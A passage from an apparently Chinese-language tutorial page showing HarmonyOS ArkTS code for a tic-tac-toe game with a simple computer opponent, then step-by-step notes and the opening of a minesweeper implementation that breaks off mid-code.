class_">Trace</span> <span class="attr">value</span>: string = <span class="string">&quot;&quot;</span>; <span class="comment">// 当前格子的值</span></span><br><span class="line">  <span class="attr">rowIndex</span>: number = <span class="number">0</span>; <span class="comment">// 格子所在的行号</span></span><br><span class="line">  <span class="attr">colIndex</span>: number = <span class="number">0</span>; <span class="comment">// 格子所在的列号</span></span><br><span class="line"> </span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">rowIndex: number, colIndex: number</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">rowIndex</span> = rowIndex;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">colIndex</span> = colIndex;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title class_">Entry</span></span><br><span class="line">@<span class="title class_">Component</span></span><br><span class="line">struct <span class="title class_">TicTacToe</span> &#123;</span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">board</span>: <span class="title class_">GridCell</span>[][] = []; <span class="comment">// 游戏板</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">currentPlayer</span>: string = <span class="string">&#x27;X&#x27;</span>; <span class="comment">// 当前玩家</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">isGameOver</span>: boolean = <span class="literal">false</span>; <span class="comment">// 游戏是否结束</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">winner</span>: string = <span class="string">&#x27;&#x27;</span>; <span class="comment">// 获胜者</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">cellSize</span>: number = <span class="number">120</span>; <span class="comment">// 单元格大小</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">cellMargin</span>: number = <span class="number">5</span>; <span class="comment">// 单元格边距</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 组件即将出现时初始化游戏</span></span><br><span class="line">  <span class="title function_">aboutToAppear</span>(): <span class="keyword">void</span> &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">board</span> = [</span><br><span class="line">      [<span class="keyword">new</span> <span class="title class_">GridCell</span>(<span class="number">0</span>, <span class="number">0</span>), <span class="keyword">new</span> <span class="title class_">GridCell</span>(<span class="number">0</span>, <span class="number">1</span>), <span class="keyword">new</span> <span class="title class_">GridCell</span>(<span class="number">0</span>, <span class="number">2</span>)],</span><br><span class="line">      [<span class="keyword">new</span> <span class="title class_">GridCell</span>(<span class="number">1</span>, <span class="number">0</span>), <span class="keyword">new</span> <span class="title class_">GridCell</span>(<span class="number">1</span>, <span class="number">1</span>), <span class="keyword">new</span> <span class="title class_">GridCell</span>(<span class="number">1</span>, <span class="number">2</span>)],</span><br><span class="line">      [<span class="keyword">new</span> <span class="title class_">GridCell</span>(<span class="number">2</span>, <span class="number">0</span>), <span class="keyword">new</span> <span class="title class_">GridCell</span>(<span class="number">2</span>, <span class="number">1</span>), <span class="keyword">new</span> <span class="title class_">GridCell</span>(<span class="number">2</span>, <span class="number">2</span>)]</span><br><span class="line">    ];</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">initGame</span>(); <span class="comment">// 初始化游戏状态</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 重置游戏状态</span></span><br><span class="line">  <span class="title function_">initGame</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; <span class="number">3</span>; j++) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">board</span>[i][j].<span class="property">value</span> = <span class="string">&#x27;&#x27;</span>; <span class="comment">// 清空所有单元格</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">currentPlayer</span> = <span class="string">&#x27;X&#x27;</span>; <span class="comment">// 设置当前玩家为X</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isGameOver</span> = <span class="literal">false</span>; <span class="comment">// 游戏未结束</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">winner</span> = <span class="string">&#x27;&#x27;</span>; <span class="comment">// 无获胜者</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 检查是否有玩家获胜</span></span><br><span class="line">  <span class="title function_">checkForWinner</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> line <span class="keyword">of</span> winningLines) &#123; <span class="comment">// 遍历所有胜利线路</span></span><br><span class="line">      <span class="keyword">const</span> mark = <span class="variable language_">this</span>.<span class="property">board</span>[line[<span class="number">0</span>]][line[<span class="number">1</span>]].<span class="property">value</span>;</span><br><span class="line">      <span class="keyword">if</span> (mark &amp;&amp; <span class="comment">// 如果有标记</span></span><br><span class="line">        mark === <span class="variable language_">this</span>.<span class="property">board</span>[line[<span class="number">2</span>]][line[<span class="number">3</span>]].<span class="property">value</span> &amp;&amp; <span class="comment">// 并且等于同一行的下一个标记</span></span><br><span class="line">        mark === <span class="variable language_">this</span>.<span class="property">board</span>[line[<span class="number">4</span>]][line[<span class="number">5</span>]].<span class="property">value</span>) &#123; <span class="comment">// 再次等于同一行的下一个标记</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">isGameOver</span> = <span class="literal">true</span>; <span class="comment">// 游戏结束</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">winner</span> = mark; <span class="comment">// 设置获胜者</span></span><br><span class="line">        <span class="keyword">return</span> mark; <span class="comment">// 返回获胜者的标记</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> allCellsFilled = <span class="variable language_">this</span>.<span class="property">board</span>.<span class="title function_">flat</span>().<span class="title function_">every</span>(<span class="function"><span class="params">cell</span> =&gt;</span> cell.<span class="property">value</span> !== <span class="string">&#x27;&#x27;</span>); <span class="comment">// 检查所有单元格是否已填满</span></span><br><span class="line">    <span class="keyword">if</span> (allCellsFilled) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">isGameOver</span> = <span class="literal">true</span>; <span class="comment">// 游戏结束</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">winner</span> = <span class="string">&#x27;平局&#x27;</span>; <span class="comment">// 设置为平局</span></span><br><span class="line">      <span class="keyword">return</span> <span class="string">&#x27;平局&#x27;</span>; <span class="comment">// 返回平局标识</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>; <span class="comment">// 无获胜者</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 玩家落子</span></span><br><span class="line">  <span class="title function_">placeMark</span>(<span class="params">rowIndex: number, colIndex: number</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">isGameOver</span> &amp;&amp; <span class="variable language_">this</span>.<span class="property">board</span>[rowIndex][colIndex].<span class="property">value</span> === <span class="string">&#x27;&#x27;</span>) &#123; <span class="comment">// 如果游戏未结束且单元格为空</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">board</span>[rowIndex][colIndex].<span class="property">value</span> = <span class="variable language_">this</span>.<span class="property">currentPlayer</span>; <span class="comment">// 放置标记</span></span><br><span class="line">      <span class="keyword">const</span> result = <span class="variable language_">this</span>.<span class="title function_">checkForWinner</span>(); <span class="comment">// 检查是否有获胜者</span></span><br><span class="line">      <span class="keyword">if</span> (result) &#123; <span class="comment">// 如果有获胜者</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">`<span class="subst">$&#123;result&#125;</span> 获胜！`</span>);</span><br><span class="line">        <span class="keyword">let</span> message = <span class="string">`<span class="subst">$&#123;result&#125;</span> 获胜！`</span>; <span class="comment">// 设置提示信息</span></span><br><span class="line">        <span class="keyword">if</span> (result === <span class="string">&#x27;平局&#x27;</span>) &#123;</span><br><span class="line">          message = <span class="string">&#x27;平局！&#x27;</span>; <span class="comment">// 如果是平局</span></span><br><span class="line">        &#125;</span><br><span class="line">        promptAction.<span class="title function_">showDialog</span>(&#123; <span class="comment">// 显示对话框</span></span><br><span class="line">          <span class="attr">title</span>: <span class="string">`游戏结束`</span>, <span class="comment">// 标题</span></span><br><span class="line">          message, <span class="comment">// 提示信息</span></span><br><span class="line">          <span class="attr">buttons</span>: [ <span class="comment">// 按钮</span></span><br><span class="line">            &#123;</span><br><span class="line">              <span class="attr">text</span>: <span class="string">&#x27;重新开始&#x27;</span>, <span class="comment">// 文本</span></span><br><span class="line">              <span class="attr">color</span>: <span class="string">&#x27;#ffa500&#x27;</span> <span class="comment">// 颜色</span></span><br><span class="line">            &#125;</span><br><span class="line">          ],</span><br><span class="line">        &#125;).<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">          <span class="variable language_">this</span>.<span class="title function_">initGame</span>(); <span class="comment">// 重新开始游戏</span></span><br><span class="line">        &#125;);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123; <span class="comment">// 如果没有获胜者</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">currentPlayer</span> = <span class="variable language_">this</span>.<span class="property">currentPlayer</span> === <span class="string">&#x27;X&#x27;</span> ? <span class="string">&#x27;O&#x27;</span> : <span class="string">&#x27;X&#x27;</span>; <span class="comment">// 切换玩家</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">currentPlayer</span> === <span class="string">&#x27;O&#x27;</span>) &#123; <span class="comment">// 如果是AI玩家</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="title function_">aiMove</span>(); <span class="comment">// AI落子</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// AI落子</span></span><br><span class="line">  <span class="title function_">aiMove</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> moveFound = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="attr">bestMove</span>: <span class="literal">null</span> | number[] = <span class="literal">null</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 寻找最佳落子位置</span></span><br><span class="line">    bestMove = <span class="variable language_">this</span>.<span class="title function_">findWinningMove</span>(<span class="string">&#x27;O&#x27;</span>); <span class="comment">// 检查AI是否有胜利机会</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">`bestMove a:<span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(bestMove)&#125;</span>`</span>);</span><br><span class="line">    <span class="keyword">if</span> (bestMove) &#123;</span><br><span class="line">      moveFound = <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      bestMove = <span class="variable language_">this</span>.<span class="title function_">findWinningMove</span>(<span class="string">&#x27;X&#x27;</span>); <span class="comment">// 检查玩家是否有胜利机会</span></span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">`bestMove b:<span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(bestMove)&#125;</span>`</span>);</span><br><span class="line">      <span class="keyword">if</span> (bestMove) &#123;</span><br><span class="line">        moveFound = <span class="literal">true</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        bestMove = <span class="variable language_">this</span>.<span class="title function_">findRandomMove</span>(); <span class="comment">// 随机落子</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">`bestMove c:<span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(bestMove)&#125;</span>`</span>);</span><br><span class="line">        <span class="keyword">if</span> (bestMove) &#123;</span><br><span class="line">          moveFound = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (moveFound &amp;&amp; bestMove) &#123; <span class="comment">// 如果找到了合适的落子位置</span></span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">`bestMove:<span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(bestMove)&#125;</span>`</span>);</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">placeMark</span>(bestMove[<span class="number">0</span>], bestMove[<span class="number">1</span>]); <span class="comment">// 落子</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 寻找给定玩家是否有机会赢，并返回这样的移动位置</span></span><br><span class="line">  <span class="title function_">findWinningMove</span>(<span class="params">player: string</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> line <span class="keyword">of</span> winningLines) &#123; <span class="comment">// 遍历所有胜利线路</span></span><br><span class="line">      <span class="keyword">let</span> missingIndex = -<span class="number">1</span>;</span><br><span class="line">      <span class="keyword">let</span> noEmptyCount = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; line.<span class="property">length</span>; i += <span class="number">2</span>) &#123; <span class="comment">// 检查每个单元格</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">board</span>[line[i]][line[i + <span class="number">1</span>]].<span class="property">value</span> === player) &#123; <span class="comment">// 如果是该玩家的标记</span></span><br><span class="line">          noEmptyCount++; <span class="comment">// 计数</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">board</span>[line[i]][line[i + <span class="number">1</span>]].<span class="property">value</span> === <span class="string">&#x27;&#x27;</span>) &#123; <span class="comment">// 如果为空</span></span><br><span class="line">          missingIndex = i; <span class="comment">// 记录空格位置</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (noEmptyCount === <span class="number">2</span> &amp;&amp; missingIndex != -<span class="number">1</span>) &#123; <span class="comment">// 如果有两个标记且有一个空格</span></span><br><span class="line">        <span class="keyword">return</span> [line[missingIndex], line[missingIndex + <span class="number">1</span>]]; <span class="comment">// 返回空格位置</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// 未找到合适位置</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 寻找一个随机的合法落子位置</span></span><br><span class="line">  <span class="title function_">findRandomMove</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="attr">emptyCells</span>: number[][] = []; <span class="comment">// 存储空格位置</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; <span class="number">3</span>; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">board</span>[i][j].<span class="property">value</span> === <span class="string">&#x27;&#x27;</span>) &#123; <span class="comment">// 如果单元格为空</span></span><br><span class="line">          emptyCells.<span class="title function_">push</span>([i, j]); <span class="comment">// 添加到空格列表</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (emptyCells.<span class="property">length</span> &gt; <span class="number">0</span>) &#123; <span class="comment">// 如果有空格</span></span><br><span class="line">      <span class="keyword">return</span> emptyCells[<span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * emptyCells.<span class="property">length</span>)]; <span class="comment">// 随机选择一个空格</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// 未找到空格</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 构建游戏界面</span></span><br><span class="line">  <span class="title function_">build</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Column</span>(&#123; <span class="attr">space</span>: <span class="number">20</span> &#125;) &#123; <span class="comment">// 创建主列布局</span></span><br><span class="line">      <span class="title class_">Flex</span>(&#123; <span class="attr">wrap</span>: <span class="title class_">FlexWrap</span>.<span class="property">Wrap</span> &#125;) &#123; <span class="comment">// 创建主行布局</span></span><br><span class="line">        <span class="title class_">ForEach</span>(<span class="variable language_">this</span>.<span class="property">board</span>, <span class="function">(<span class="params">row: GridCell[], _index: number</span>) =&gt;</span> &#123; <span class="comment">// 遍历每一行</span></span><br><span class="line">          <span class="title class_">ForEach</span>(row, <span class="function">(<span class="params">cell: GridCell, _index: number</span>) =&gt;</span> &#123; <span class="comment">// 遍历每一个单元格</span></span><br><span class="line">            <span class="title class_">Text</span>(cell.<span class="property">value</span>) <span class="comment">// 显示单元格内的文本</span></span><br><span class="line">              .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize&#125;</span>lpx`</span>) <span class="comment">// 设置宽度</span></span><br><span class="line">              .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize&#125;</span>lpx`</span>) <span class="comment">// 设置高度</span></span><br><span class="line">              .<span class="title function_">margin</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellMargin&#125;</span>lpx`</span>) <span class="comment">// 设置边距</span></span><br><span class="line">              .<span class="title function_">fontSize</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize / <span class="number">2</span>&#125;</span>lpx`</span>) <span class="comment">// 设置字体大小</span></span><br><span class="line">              .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>) <span class="comment">// 居中文本</span></span><br><span class="line">              .<span class="title function_">backgroundColor</span>(cell.<span class="property">value</span> === <span class="string">&#x27;X&#x27;</span> ? <span class="title class_">Color</span>.<span class="property">Red</span> : <span class="comment">// 设置背景颜色</span></span><br><span class="line">                cell.<span class="property">value</span> === <span class="string">&#x27;O&#x27;</span> ? <span class="title class_">Color</span>.<span class="property">Blue</span> : <span class="title class_">Color</span>.<span class="property">Gray</span>)</span><br><span class="line">              .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>) <span class="comment">// 设置字体颜色</span></span><br><span class="line">              .<span class="title function_">borderRadius</span>(<span class="number">5</span>) <span class="comment">// 设置圆角</span></span><br><span class="line">              .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// 点击事件</span></span><br><span class="line">                <span class="variable language_">this</span>.<span class="title function_">placeMark</span>(cell.<span class="property">rowIndex</span>, cell.<span class="property">colIndex</span>); <span class="comment">// 落子</span></span><br><span class="line">              &#125;);</span><br><span class="line">          &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">      .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;(<span class="variable language_">this</span>.cellSize + <span class="variable language_">this</span>.cellMargin * <span class="number">2</span>) * <span class="number">3</span>&#125;</span>lpx`</span>) <span class="comment">// 设置宽度</span></span><br><span class="line">      <span class="title class_">Button</span>(<span class="string">&#x27;重新开始&#x27;</span>) <span class="comment">// 重新开始按钮</span></span><br><span class="line">        .<span class="title function_">width</span>(<span class="string">&#x27;50%&#x27;</span>) <span class="comment">// 设置宽度</span></span><br><span class="line">        .<span class="title function_">height</span>(<span class="string">&#x27;10%&#x27;</span>) <span class="comment">// 设置高度</span></span><br><span class="line">        .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// 点击事件</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="title function_">initGame</span>(); <span class="comment">// 重新开始游戏</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// 设置宽度</span></span><br><span class="line">    .<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>); <span class="comment">// 设置高度</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="mine"><a href="#mine" class="headerlink" title="mine"></a>mine</h1><p>扫雷 </p><p>实现步骤</p><p>步骤1：定义游戏状态</p><p>首先，我们需要定义游戏的状态变量，包括游戏面板数据、地雷数量、已揭示方块集合、标记为地雷的方块集合等。</p><p>步骤2：初始化游戏</p><p>在组件即将显示时初始化游戏，包括清空状态变量、生成游戏面板、放置地雷等。</p><p>步骤3：生成游戏面板与放置地雷</p><p>游戏面板由10x10的方块组成，随机放置10个地雷，并计算每个方块周围的地雷数量。</p><p>步骤4：处理用户交互</p><p>用户可以通过点击方块来揭示其内容，也可以通过长按来标记地雷。</p><p>步骤5：显示游戏结果</p><p>当玩家揭示到地雷时，游戏结束；当所有非雷方块都被揭示时，游戏胜利。</p><p>步骤6：定义Cell类</p><p>最后，定义一个Cell类来存储每个方块的信息。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; promptAction &#125; <span class="keyword">from</span> <span class="string">&#x27;@kit.ArkUI&#x27;</span>;</span><br><span class="line"> </span><br><span class="line">@<span class="title class_">Entry</span></span><br><span class="line">@<span class="title class_">Component</span></span><br><span class="line">struct <span class="title class_">MineSweeper</span> &#123;</span><br><span class="line">  <span class="comment">// 游戏面板数据</span></span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">gameBoard</span>: <span class="title class_">Cell</span>[][] = [];</span><br><span class="line">  <span class="comment">// 地雷总数</span></span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">mineCount</span>: number = <span class="number">10</span>;</span><br><span class="line">  <span class="comment">// 已经揭示的方块集合</span></span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">revealedCells</span>: <span class="title class_">Set</span>&lt;string&gt; = <span class="keyword">new</span> <span class="title class_">Set</span>();</span><br><span class="line">  <span class="comment">// 标记为地雷的方块集合</span></span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">flaggedCells</span>: <span class="title class_">Set</span>&lt;string&gt; = <span class="keyword">new</span> <span class="title class_">Set</span>();</span><br><span class="line">  <span class="comment">// 方块大小</span></span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">cellSize</span>: number = <span class="number">60</span>;</span><br><span class="line">  <span class="comment">// 方块之间的边距</span></span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">cellMargin</span>: number = <span class="number">2</span>;</span><br><span class="line">  <span class="comment">// 游戏开始时间</span></span><br><span class="line">  private <span class="attr">startTime</span>: number = <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line">  <span class="comment">// 游戏结束标志</span></span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">isGameOver</span>: boolean = <span class="literal">false</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 在组件即将显示时初始化游戏</span></span><br><span class="line">  <span class="title function_">aboutToAppear</span>(): <span class="keyword">void</span> &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">initializeGame</span>();</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 初始化游戏</span></span><br><span class="line">  private <span class="title function_">initializeGame</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isGameOver</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">startTime</span> = <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">revealedCells</span>.<span class="title function_">clear</span>();</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">flaggedCells</span>.<span class="title function_">clear</span>();</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">generateBoard</span>();</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 